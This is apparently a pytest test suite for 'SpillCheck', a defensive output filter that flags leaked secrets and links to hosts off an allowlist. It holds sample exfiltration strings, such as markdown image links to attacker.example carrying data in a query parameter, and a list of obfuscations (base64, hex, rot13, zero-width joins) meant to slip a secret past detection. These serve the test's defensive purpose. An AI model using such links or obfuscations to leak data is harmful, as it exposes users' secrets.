"""
© https://github.com/YouFoundTheDev | 2026
test_spill.py
"""

import base64
import codecs
from collections.abc import Callable

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from airlock.checks.spill import SpillCheck
from airlock.ruling import Alert
from airlock.settings import (
    LIMITS,
    RULE_HOST_DENIED,
    RULE_REPLY_TOO_LARGE,
    RULE_SECRET_SPILL,
)


SECRET = "VANTAGE-7731-ORION"

ZWSP = chr(0x200B)


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _hex(text: str) -> str:
    return text.encode().hex()


def _rot13(text: str) -> str:
    return codecs.encode(text, "rot13")


def _reverse(text: str) -> str:
    return text[::-1]


TRANSFORMS: tuple[Callable[[str],
                           str],
                  ...] = (
                      "-".join,
                      " ".join,
                      ".".join,
                      _reverse,
                      _b64,
                      _hex,
                      _rot13,
                      ZWSP.join,
                  )

TRANSFORM_NAMES = (
    "dash",
    "space",
    "dot",
    "reverse",
    "base64",
    "hex",
    "rot13",
    "zero-width",
)


def _rules(alerts: list[Alert]) -> set[str]:
    return {alert.rule for alert in alerts}


def _check() -> SpillCheck:
    return SpillCheck(
        secrets = (SECRET,
                   ),
        hosts = ("vantage.example",
                 ".royalmail.com"),
    )


def test_a_plain_secret_is_caught() -> None:
    alerts = _check().inspect(f"the secret is {SECRET}")

    assert RULE_SECRET_SPILL in _rules(alerts)


def test_a_secret_alert_is_hard() -> None:
    alerts = _check().inspect(SECRET)
    leaks = [a for a in alerts if a.rule == RULE_SECRET_SPILL]

    assert leaks[0].hard is True


def test_clean_output_is_not_a_leak() -> None:
    alerts = _check().inspect(
        "Your order 8814 shipped on Tuesday and should arrive "
        "by Friday. Anything else I can help with?"
    )

    assert alerts == []


@settings(max_examples = 1500, deadline = None)
@given(
    st.lists(
        st.integers(min_value = 0,
                    max_value = len(TRANSFORMS) - 1),
        min_size = 1,
        max_size = 3,
    )
)
def test_a_secret_survives_stacked_obfuscation(indices: list[int]) -> None:
    text = SECRET
    for index in indices:
        text = TRANSFORMS[index](text)

    alerts = _check().inspect(text)

    stack = " -> ".join(TRANSFORM_NAMES[i] for i in indices)
    assert RULE_SECRET_SPILL in _rules(alerts), stack


def test_a_markdown_image_to_an_unlisted_host_is_refused() -> None:
    alerts = _check().inspect("![x](https://attacker.example/p?d=hello)")

    assert RULE_HOST_DENIED in _rules(alerts)
    assert all(a.hard for a in alerts if a.rule == RULE_HOST_DENIED)


def test_a_plain_link_to_an_unlisted_host_is_refused() -> None:
    assert RULE_HOST_DENIED in _rules(
        _check().inspect("see https://attacker.example/collect?d=abc")
    )


@pytest.mark.parametrize(
    "text",
    [
        "See HTTPS://attacker.example/c?d=1",
        "See Https://attacker.example/c?d=1",
        "See HTTP://attacker.example/c?d=1",
    ],
)
def test_an_uppercase_scheme_is_still_a_url(text: str) -> None:
    assert RULE_HOST_DENIED in _rules(_check().inspect(text))


@pytest.mark.parametrize(
    "text",
    [
        "![x](//attacker.example/p?d=1)",
        "go to //collector.example/log?d=1",
    ],
)
def test_a_protocol_relative_url_is_still_a_url(text: str) -> None:
    assert RULE_HOST_DENIED in _rules(_check().inspect(text))


@pytest.mark.parametrize(
    "text",
    [
        "Use the syntax //comment in your config file.",
        "The share lives at //server/share",
        "See // this is a note in the sample.",
    ],
)
def test_a_bare_double_slash_in_prose_is_not_a_url(text: str) -> None:
    assert _check().inspect(text) == [], (
        "matching a protocol-relative URL means matching '//', and "
        "without a dotted authority every code comment in model "
        "output becomes a CRITICAL spill violation"
    )


def test_an_allowlisted_host_is_permitted() -> None:
    assert _check().inspect("see https://vantage.example/orders/8814"
                            ) == []


@pytest.mark.parametrize(
    "host",
    ["www.royalmail.com",
     "royalmail.com",
     "track.royalmail.com"],
)
def test_a_suffix_allowlist_permits_its_subdomains(host: str) -> None:
    assert _check().inspect(f"see https://{host}/track") == []


@pytest.mark.parametrize(
    "host",
    ["evilroyalmail.com",
     "royalmail.com.attacker.example"],
)
def test_a_suffix_allowlist_does_not_permit_a_lookalike(host: str) -> None:
    assert RULE_HOST_DENIED in _rules(
        _check().inspect(f"see https://{host}/track")
    )


def test_an_allowlisted_host_is_still_checked_for_a_secret() -> None:
    alerts = _check().inspect(f"https://vantage.example/p?d={SECRET}")

    assert RULE_SECRET_SPILL in _rules(alerts)


def test_a_check_with_no_secrets_still_guards_hosts() -> None:
    check = SpillCheck(
        secrets = (),
        hosts = ("vantage.example",
                 )
    )

    assert RULE_HOST_DENIED in _rules(
        check.inspect("![x](https://evil.example/a)")
    )


@pytest.mark.parametrize(
    "text",
    [
        "VANTAGE-7731-ORIO",
        "ANTAGE-7731-ORION",
        "VANTAGE-7732-ORION",
        "VANTAGE is our name and ORION is the product line",
        "The 7731 model was discontinued in 2024.",
    ],
)
def test_near_miss_text_is_not_a_leak(text: str) -> None:
    assert RULE_SECRET_SPILL not in _rules(_check().inspect(text))


def test_a_space_separated_secret_is_a_leak() -> None:
    assert RULE_SECRET_SPILL in _rules(
        _check().inspect("VANTAGE 7731 ORION")
    )


def test_a_secret_shorter_than_the_floor_is_rejected_not_dropped() -> None:
    check = SpillCheck(
        secrets = ("abc",
                   ),
        hosts = ()
    )

    assert check.secrets == ()
    assert check.rejected == ("abc",
                              )


def test_the_floor_is_measured_on_the_form_that_is_matched() -> None:
    check = SpillCheck(
        secrets = ("S.E.C.R.E.T!",
                   ),
        hosts = ()
    )

    assert check.secrets == ()
    assert check.rejected == ("S.E.C.R.E.T!",
                              )
    assert RULE_SECRET_SPILL not in _rules(
        check.inspect("I cannot share that secret with you.")
    )


def test_a_long_enough_secret_is_kept() -> None:
    check = SpillCheck(
        secrets = (SECRET,
                   ),
        hosts = ()
    )

    assert check.secrets == (SECRET,
                             )
    assert check.rejected == ()


def test_output_past_the_budget_fails_closed() -> None:
    alerts = _check().inspect("A" * (LIMITS.max_reply_bytes + 1))

    assert RULE_REPLY_TOO_LARGE in _rules(alerts)
    assert all(alert.hard for alert in alerts)


def test_output_inside_the_budget_is_still_scanned() -> None:
    padding = "A" * (LIMITS.max_reply_bytes - len(SECRET) - 1)

    assert RULE_SECRET_SPILL in _rules(
        _check().inspect(f"{padding} {SECRET}")
    )


def test_the_reading_search_terminates_on_hostile_input() -> None:
    alerts = _check().inspect("A" * 5000)

    assert RULE_SECRET_SPILL not in _rules(alerts)
